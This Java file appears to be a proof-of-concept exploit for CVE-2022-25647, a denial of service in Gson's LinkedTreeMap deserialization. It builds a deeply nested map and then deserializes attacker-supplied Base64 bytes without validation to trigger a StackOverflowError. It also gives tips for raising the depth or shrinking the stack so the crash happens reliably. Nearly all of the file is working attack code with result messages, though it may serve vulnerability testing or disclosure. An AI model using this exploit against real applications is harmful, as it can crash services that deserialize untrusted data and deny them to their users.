import com.google.gson.internal.LinkedTreeMap;

import java.io.*;
import java.util.Base64;
import java.util.Scanner;

public class poc {

    public static void main(String[] args) throws Exception {

       
        System.out.println("[*] Building 500-level deep LinkedTreeMap...");

        LinkedTreeMap<String, Object> root = new LinkedTreeMap<>();
        LinkedTreeMap<String, Object> current = root;

        for (int i = 0; i < 500; i++) {
            LinkedTreeMap<String, Object> child = new LinkedTreeMap<>();
            child.put("level", i);
            current.put("child", child);
            current = child;
        }

        System.out.println("[*] Built.\n");

  
        System.out.println("[*] oos.writeObject(root)...");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(root);
        oos.close();

        byte[] normalBytes = baos.toByteArray();
        String check = new String(normalBytes, "ISO-8859-1");
        System.out.println("    Contains LTM : " + check.contains("LinkedTreeMap")); // false
        System.out.println("    Contains LHM : " + check.contains("LinkedHashMap")); // true
        System.out.println("    writeReplace fired — LTM swapped to LHM in bytes\n");


        System.out.println("[*] ois.readObject() on normal bytes...");

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(normalBytes);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object result = ois.readObject();
            ois.close();
            System.out.println("    Class      : " + result.getClass().getName());
            System.out.println("    No crash — bytes contained LHM, not LTM");
            System.out.println("    writeReplace protected the outgoing side\n");

        } catch (StackOverflowError e) {
            System.out.println("    [CRASH] Unexpected crash on normal bytes");
        }


        System.out.println("-------------------------------------------------");
        System.out.println("[*] Now paste attacker bytes (Base64)");
        System.out.println("    These bytes should contain LinkedTreeMap");
        System.out.println("    Use mode 1 from the generator to get them");
        System.out.println("-------------------------------------------------");
        System.out.print("> ");

        Scanner scanner = new Scanner(System.in);
        String input = scanner.nextLine().trim();
        scanner.close();

        if (input.isEmpty()) {
            System.out.println("[!] No input given. Exiting.");
            return;
        }


        byte[] attackBytes;
        try {
            attackBytes = Base64.getDecoder().decode(input);
            System.out.println("\n[*] Decoded : " + attackBytes.length + " bytes");

            String asString = new String(attackBytes, "ISO-8859-1");
            System.out.println("    Contains LTM : " + asString.contains("LinkedTreeMap")); // true
            System.out.println("    Contains LHM : " + asString.contains("LinkedHashMap")); // false

        } catch (Exception e) {
            System.out.println("[!] Invalid Base64 input: " + e.getMessage());
            return;
        }


        System.out.println("\n[*] ois.readObject() on attacker bytes...");
        System.out.println("    No guard. No validation. Just reads.");

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(attackBytes);
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject(); 
            ois.close();

            System.out.println("    No crash at this depth");
            System.out.println("    Increase depth to 5000 or set -Xss256k in VM args");

        } catch (StackOverflowError e) {
            System.out.println("\n    *** CRASH ***");
            System.out.println("    StackOverflowError");
            System.out.println("    ois recursed 500 levels deep reconstructing LTM");
            System.out.println("    Call stack exhausted — thread dead");
            System.out.println("\n[RESULT] >>> CVE-2022-25647 DoS TRIGGERED <<<");

        } catch (java.io.InvalidClassException e) {
            System.out.println("\n    [BLOCKED] InvalidClassException: " + e.getMessage());
            System.out.println("[RESULT] >>> PATCHED — Gson 2.8.9 rejected LTM <<<");

        } catch (Exception e) {
            System.out.println("    [ERROR] " + e.getClass().getName() + ": " + e.getMessage());
        }
    }
}